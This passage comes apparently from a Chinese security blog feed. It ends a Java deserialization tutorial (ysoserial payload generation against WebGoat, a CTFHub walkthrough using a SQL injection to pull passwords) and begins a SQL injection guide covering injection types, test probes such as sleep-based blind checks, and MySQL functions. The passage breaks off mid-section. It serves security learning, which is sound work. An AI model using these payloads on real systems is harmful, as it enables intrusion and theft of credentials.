class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化:对参数指定的obj对象进行序列化，将字节序列写入到一个目标输出流中</span></span><br><span class="line">ObjectOutputStream类 writeObject()</span><br><span class="line"><span class="comment">//反序列化:从一个源输入流中读取字节序列，把他们反序列化为一个对象，将其返回</span></span><br><span class="line">ObjectIntputStream类 readObject()</span><br></pre></td></tr></table></figure><p><strong>工具</strong>    <a href="https://github.com/frohoff/ysoserial/releases">https://github.com/frohoff/ysoserial/releases</a></p><p><strong>WebGoat</strong>    <a href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0</span><br><span class="line">docker images</span><br><span class="line">docker run -p 8080:8080 -t webgoat/webgoat-8.0</span><br><span class="line">http://192.168.158.111:8080/WebGoat/login</span><br></pre></td></tr></table></figure><h2 id="4-1-WebGoat"><a href="#4-1-WebGoat" class="headerlink" title="4.1 WebGoat"></a>4.1 WebGoat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l</span><br><span class="line">即序列化+base64加密</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/15/bMn8ex1dK7QRVPD.png" alt="image-20210504171938337"></p><p><strong>命令执行 + 反弹 shell(以免不会回显)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#思路:以 执行 ipconfig 命令为例</span></span><br><span class="line">ipconfig --&gt; 序列化 --&gt; base64加密 --&gt; 最终转换成以rO0AB格式开头的字符串作为我们的payload</span><br></pre></td></tr></table></figure><p><strong>工具形成 payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure><p>再将生成的 payload.bin 进行一个base64加密：使用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&quot;payload.bin路径&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cc = base64.urlsafe_b64encode(c)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;wt&quot;</span>,ecoding=<span class="string">&quot;utf-8&quot;</span>).write(cc.decode())</span><br></pre></td></tr></table></figure><h2 id="4-2-CTFHUB-—-think-java"><a href="#4-2-CTFHUB-—-think-java" class="headerlink" title="4.2 CTFHUB —- think_java"></a>4.2 CTFHUB —- think_java</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /common/test/sqlDict HTTP/1.1</span><br><span class="line">Host: challenge-516f101de06176a6.sandbox.ctfhub.com:10080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">dbName=myapp?a=&#x27; union select (select pwd from user)#</span><br></pre></td></tr></table></figure><p>SQL注入获取用户账号吗和密码</p><p>登陆成功</p><p>对方回显数据：一段 ro0AB开头的数据</p><p>先进行base64解密</p><p>使用serializationDumper工具进行解析反序列话的数据</p><p>java -jar SerializationDumper.jar base64</p><p><img src="https://i.loli.net/2021/09/15/jJ5y4FCiGpXvRWZ.png" alt="image-20210504180422065"></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p><p><img src="https://i.loli.net/2021/09/15/3iUZ8msAvRtHIjb.png" alt="image-20210504155703612"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="WEB漏洞详解" scheme="https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    
    
    <category term="序列化与反序列化" scheme="https://xizhi-future.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入全解</title>
    <link href="https://xizhi-future.github.io/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/"/>
    <id>https://xizhi-future.github.io/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/</id>
    <published>2021-10-07T10:07:52.000Z</published>
    <updated>2021-10-23T08:48:57.119Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h1 id="SQL-注入全解"><a href="#SQL-注入全解" class="headerlink" title="SQL 注入全解"></a>SQL 注入全解</h1><p><a href="https://www.cnblogs.com/csnd/p/11807596.html#%E4%B8%83%EF%BC%9AREGEXP%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D">SQL 注入 详解</a></p><h2 id="一、注入分类"><a href="#一、注入分类" class="headerlink" title="一、注入分类"></a>一、注入分类</h2><ul><li><p><strong>注入点分类</strong></p><ul><li>数字型注入</li><li>字符型注入：单引号，双引号，加括号等等</li></ul></li><li><p><strong>提交方式分类</strong></p><ul><li>GET 方式注入</li><li>POST 方式注入</li><li>COOKIE 方式注入</li><li>HTTP 头部注入：XFF，UA，REFRERE</li></ul></li><li><p><strong>是否回显</strong></p><ul><li><p>联合查询</p></li><li><p>布尔盲注</p></li><li><p>报错注入</p></li><li><p>时间盲注</p></li><li><p>二次注入</p></li><li><p>堆叠查询（同时执行多条语句）</p></li></ul></li></ul><h2 id="二、注入判断"><a href="#二、注入判断" class="headerlink" title="二、注入判断"></a>二、注入判断</h2><ol><li><p><strong>工具扫描</strong>：网站漏扫工具，AWVS、AppScan、OWASP-ZAP、Nessus等</p></li><li><p><strong>手动测试：</strong></p><ul><li><p>单双引号，括号，进行组合测试，看是否报错</p></li><li><p><strong>对于数字型</strong>   <code>?id=3-1</code>  <code>?id=2#</code></p><p>如果显示的是 <code>?id=2</code> 时的正常页面，就说明我们所写的表达式进行了正确运算，可判断注入点是 数字型注入；如果返回不正常，则可能是非数字型注入。</p></li><li><p><strong>对于字符型</strong>   <code>?id=2a</code>   <code>?id=2&#39;#</code></p><p>Mysql 中，等号两边如果类型不一致，会发生强制类型转换。当数字与字符串进行比较时，首先先将字符串转换成数字，然后再进行比较。类似于 PHP 里面的 弱类型比较 ==。</p></li></ul><p><img src="https://i.loli.net/2021/08/19/2NOpAGDxYnlS9tJ.png" alt="image-20210819204302057"></p><ul><li><p><strong>对于布尔盲注</strong>   </p><p> <code>?id=1&#39; and &#39;1</code>        <code>?id=1&#39; and &#39;a</code></p><p>这里没有使用注释符号进行后面的单引号闭合，使用的是手工单引号闭合</p><p>或者，</p><p><code>?id=1&#39; and 1=1#</code>      <code>?id=1&#39; and 1=2#</code></p><p>两者的页面截然不同，一个正常回显，一个没有回显的话，就可判断是布尔盲注。</p></li><li><p><strong>对于 时间盲注</strong></p><p><code>?id=1&#39; and sleep(3)#</code>  ，类似的有以下几种</p><p>在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p><p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。</p><table><thead><tr><th>MySQL</th><th>benchmark(100000000,md(5))                              sleep(3)</th></tr></thead><tbody><tr><td>PostgreSQL</td><td>PG_sleep(5)                                                                  Generate_series(1,1000000)</td></tr><tr><td>SQLServer</td><td>waitfor delay ‘0:0:5’在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</td></tr></tbody></table></li><li><p>在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</p></li></ul></li><li><p><strong>常见 SQL 注入功能点</strong></p><p>只要是存在数据库交互的地方都有可能出现 SQL 注入。</p><p>常出现在 登录页面、订单页面、文章或新闻展示页面、修改密码页面（二次注入）、涉及获取 HTTP 头（XFF等）的功能点等。</p></li><li><p><strong>注释：–+    #</strong></p></li><li><p><strong>闭合方法：注释闭合、手动闭合 and ‘1</strong></p></li></ol><h2 id="三、Mysql-注入"><a href="#三、Mysql-注入" class="headerlink" title="三、Mysql 注入"></a>三、Mysql 注入</h2><h3 id="3-1-必备"><a href="#3-1-必备" class="headerlink" title="3.1 必备"></a>3.1 必备</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注释：</span><br><span class="line">#   </span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">/*......*/</span></span><br><span class="line"><span class="comment">/*!......*/</span></span><br></pre></td></tr></table></figure><p><strong>元数据库 information_schema</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">元数据库 information_schema 中：</span><br><span class="line"></span><br><span class="line">存放数据库信息的表：schemata</span><br><span class="line">schemata 表中</span><br><span class="line">字段 schema_name 存放所有数据库名；</span><br><span class="line"></span><br><span class="line">存放表信息的表：tables</span><br><span class="line">tables 表中</span><br><span class="line">字段 table_name 存放所有表名</span><br><span class="line">字段 table_schema 存放所有表所在的数据库名；</span><br><span class="line"></span><br><span class="line">存放所有字段信息的表：columns</span><br><span class="line">columns 表中</span><br><span class="line">字段 column_name 存放所有字段名，</span><br><span class="line">字段 table_name 存放所有字段所在的表名，</span><br><span class="line">字段 table_schema 存放所有字段所在的数据库名；</span><br></pre></td></tr></table></figure><p><strong>语句分类：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>DQL(数据查询语言)：查询语句，所有的 <span class="keyword">select</span> 语句</span><br><span class="line"><span class="number">2.</span>DML(数据操作语言)：<span class="keyword">insert</span> , <span class="keyword">delete</span> , update , 对表中的 数据 进行 增删改</span><br><span class="line"><span class="number">3.</span>DDL(数据定义语言)：<span class="keyword">create</span> , <span class="keyword">drop</span> , <span class="keyword">alter</span> 对表 结构 的 增删改</span><br><span class="line"><span class="number">4.</span>TCL(事务控制语言)：<span class="keyword">commit</span> 提交数据，<span class="keyword">rollback</span> 回滚数据 Transaction</span><br><span class="line"><span class="number">5.</span>DCL(数据控制语言)：<span class="keyword">grant</span> 授权，<span class="keyword">revoke</span> 撤销权限等</span><br></pre></td></tr></table></figure><p><strong>基本语句：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 查库：</span><br><span class="line"><span class="keyword">show</span> databases；</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata；</span><br><span class="line"># 建库：</span><br><span class="line"><span class="keyword">create</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 删库：</span><br><span class="line"><span class="keyword">drop</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 进入数据库：</span><br><span class="line">use <span class="operator">+</span> 库名；</span><br><span class="line"></span><br><span class="line"># 查表：</span><br><span class="line"><span class="keyword">show</span> tables；</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>；</span><br><span class="line"># 查列：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users；</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>；</span><br><span class="line"># 查字段：</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> security.users；</span><br></pre></td></tr></table></figure><p><strong>基本函数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#数据库安装、路径，用户 信息</span><br><span class="line">version();            Mysql 数据库版本</span><br><span class="line">database();           当前 数据库名</span><br><span class="line"><span class="keyword">user</span>();               数据库的用户名</span><br><span class="line"><span class="built_in">current_user</span>();       当前用户名</span><br><span class="line"><span class="built_in">session_user</span>();  连接到数据库的用户名</span><br><span class="line"><span class="built_in">system_user</span>();        系统用户名</span><br><span class="line">@<span class="variable">@datadir</span>();          数据库文件的存放路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os; 操作系统版本</span><br><span class="line">@<span class="variable">@basedir</span>;  数据库的安装目录</span><br><span class="line"></span><br><span class="line">#字符串长度、截取</span><br><span class="line">length();             返回字符串的长度</span><br><span class="line"><span class="built_in">substring</span>(a,b,c);     截取字符串</span><br><span class="line">substr(a,b,c);  </span><br><span class="line">mid(a,b,c);  </span><br><span class="line">三个参数：a.截取的字符串 b.截取的起始位置 c.长度</span><br><span class="line"><span class="keyword">left</span>(a,b);            从左侧截取a的前b位，正确返回<span class="number">1</span>，错误返回<span class="number">0</span></span><br><span class="line"></span><br><span class="line">#字符串配对连接</span><br><span class="line">concat(a,<span class="number">0x5e</span>,b);     字符串配对连接</span><br><span class="line">concat_ws(<span class="string">&#x27;~&#x27;</span>,A,B);   含有分隔符的连接字符串</span><br><span class="line">group_concat();       将字符串连接为一个组，可将不同列分到同一行中</span><br><span class="line"></span><br><span class="line">#字符串特殊处理</span><br><span class="line">ord();                返回ASCII码</span><br><span class="line">ascii(<span class="string">&#x27;a&#x27;</span>);           将字母 a 转换为ascii值</span><br><span class="line">rand();               返回<span class="number">0</span><span class="operator">~</span><span class="number">1</span>之间的随机浮点数</span><br><span class="line">round();              返回最近的整数值</span><br><span class="line">md5();                返回MD5值</span><br><span class="line">hex();                将字符串转换为十六进制</span><br><span class="line">unhex();              hex()的反向操作</span><br><span class="line"><span class="built_in">floor</span>(x);             返回不大于x的最大整数</span><br><span class="line">load_file();          读取文件，返回文件内容作为一个字符串</span><br><span class="line">sleep(a);             沉睡a秒</span><br><span class="line">if(<span class="literal">true</span>,t,f);         判断语句为<span class="literal">true</span> ,执行第一个，否则第二个</span><br><span class="line">find_in_set();        返回字符串在字符串列表中的位置</span><br><span class="line">benchmark();          指定语句执行的次数</span><br><span class="line">name_const();         返回表作为结果</span><br></pre></td></tr></table></figure><p><strong>导入数据：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当希望导入一个 较大 的文件或者是想要批量的执行<span class="keyword">sql</span>语句时，可以使用 mysql 中的 source 命令</span><br><span class="line">使用方法：source <span class="operator">+</span> 文件路径(直接拖拽)</span><br></pre></td></tr></table></figure><h3 id="3-2-语句"><a href="#3-2-语句" class="headerlink" title="3.2 语句"></a>3.2 语句</h3><p><strong>mysql 对 表的结构的更改语句</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create</span></span><br><span class="line">create table 表名(</span><br><span class="line">     字段名1，数据类型，</span><br><span class="line">     字段名2，数据类型，</span><br><span class="line">     字段名3，数据类型，</span><br><span class="line">     ......</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># insert</span></span><br><span class="line">insert into 表名(字段名1，字段名2，字段名3......) values(值1，值2，值3......)；</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete</span></span><br><span class="line">delete from 表名 <span class="built_in">where</span> 条件;//可回滚</span><br><span class="line">对于大表：</span><br><span class="line">truncate table 表名;//不可回滚，将会永久丢失</span><br><span class="line"></span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">update 表名 <span class="built_in">set</span> 字段名1=值1,字段名2=值2,......<span class="built_in">where</span> 条件；</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改表名称：</span></span><br><span class="line">语法一： alter table tbl_name rename[to|as] new_tbl_name--可以更改一张数据表名称</span><br><span class="line">语法二：rename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namew……--可以多表更改名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加表列</span></span><br><span class="line">alter table <span class="built_in">test</span> add column name varchar(10); </span><br><span class="line"></span><br><span class="line"><span class="comment">#删除表列</span></span><br><span class="line">alter table <span class="built_in">test</span> drop column name; </span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列类型</span></span><br><span class="line">alter table <span class="built_in">test</span> modify address char(10) </span><br><span class="line">||alter table <span class="built_in">test</span> change address address char(40)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列名</span></span><br><span class="line">alter table <span class="built_in">test</span> change column address address1 varchar(30)</span><br></pre></td></tr></table></figure><p><strong>常用字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，...... <span class="keyword">from</span> <span class="operator">+</span> 表名 <span class="keyword">where</span> <span class="operator">+</span> 条件;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">between</span> <span class="keyword">and</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">8</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;=</span><span class="number">2</span> <span class="keyword">and</span> id <span class="operator">&lt;=</span><span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">in</span>   <span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">指查找出 id不等于<span class="number">5</span> 和 id不等于<span class="number">8</span> 的用户的密码</span><br><span class="line">注：不是 <span class="number">5</span><span class="operator">~</span><span class="number">8</span>，<span class="keyword">in</span>之后不是一个区间 </span><br><span class="line"></span><br><span class="line"># <span class="keyword">like</span></span><br><span class="line"><span class="number">1.</span><span class="operator">%</span> 代表任意多个字符</span><br><span class="line"><span class="number">2.</span>_ 代表任意一个字符</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有字母b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;_a%&#x27;</span>;</span><br><span class="line">指查找出用户名中带第二个字母为a的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b&#x27;</span>;</span><br><span class="line">指查找出用户名中带最后一个字母为b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%\_%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有下划线_的用户名</span><br><span class="line">注：特殊字符需要转义</span><br><span class="line"></span><br><span class="line"># <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名；</span><br><span class="line">注：默认为升序排列</span><br><span class="line">指定升序：<span class="keyword">asc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">asc</span>；</span><br><span class="line">指定降序：<span class="keyword">desc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">desc</span>；</span><br><span class="line">双重需求：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名<span class="number">1</span> <span class="keyword">desc</span>,字段名<span class="number">2</span> <span class="keyword">asc</span>；</span><br><span class="line"></span><br><span class="line"># 分组函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"># 空处理函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(salary,<span class="number">0</span>)<span class="operator">*</span><span class="number">12</span>), <span class="keyword">from</span> crew;</span><br><span class="line">求一年的薪水之和，当薪水为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br><span class="line"></span><br><span class="line"># <span class="built_in">count</span>(<span class="operator">*</span>) 与 count</span><br><span class="line"><span class="built_in">count</span>(<span class="operator">*</span>) :统计总记录条数，而不是统计某个字段中的数据，与字段无关</span><br><span class="line"><span class="built_in">count</span>(具体的某个字段)：统计具体字段中不为<span class="keyword">NULL</span>的总数</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>字符串数据 sum,avg 为 <span class="number">0</span>，max,min 按字母大小取</span><br><span class="line"><span class="number">2.</span>分组函数会自动忽略 <span class="keyword">NULL</span></span><br><span class="line"><span class="number">3.</span>数学运算 中如果有<span class="keyword">NULL</span>参与，结果为定为<span class="keyword">NULL</span></span><br><span class="line"><span class="number">4.</span>分组函数不能直接出现在 <span class="keyword">where</span> 后面，原因是 <span class="keyword">group</span> <span class="keyword">by</span> 是在<span class="keyword">where</span>语句执行结束之后执行的</span><br><span class="line"><span class="number">5.</span>分组函数可组合使用</span><br><span class="line"></span><br><span class="line"># <span class="keyword">group</span> <span class="keyword">by</span> 与 <span class="keyword">having</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：按照某个字段或某些字段进行分组</span><br><span class="line"><span class="keyword">having</span>：对分组之后的数据进行再次过滤，即<span class="keyword">having</span> 必须跟在 <span class="keyword">group</span> <span class="keyword">by</span> 后面使用</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先根据班级分组，再查出各个班级的成绩最高学生的成绩</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>分组函数一般与 <span class="keyword">group</span> <span class="keyword">by</span> 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 <span class="keyword">group</span> <span class="keyword">by</span> 语句执行结束后才会执行</span><br><span class="line"><span class="number">2.</span>当一条<span class="keyword">sql</span>语句没有 <span class="keyword">group</span> <span class="keyword">by</span> 时，整张表会自成一组</span><br><span class="line"><span class="number">3.</span>当<span class="keyword">sql</span>语句中使用<span class="keyword">group</span> <span class="keyword">by</span>时，<span 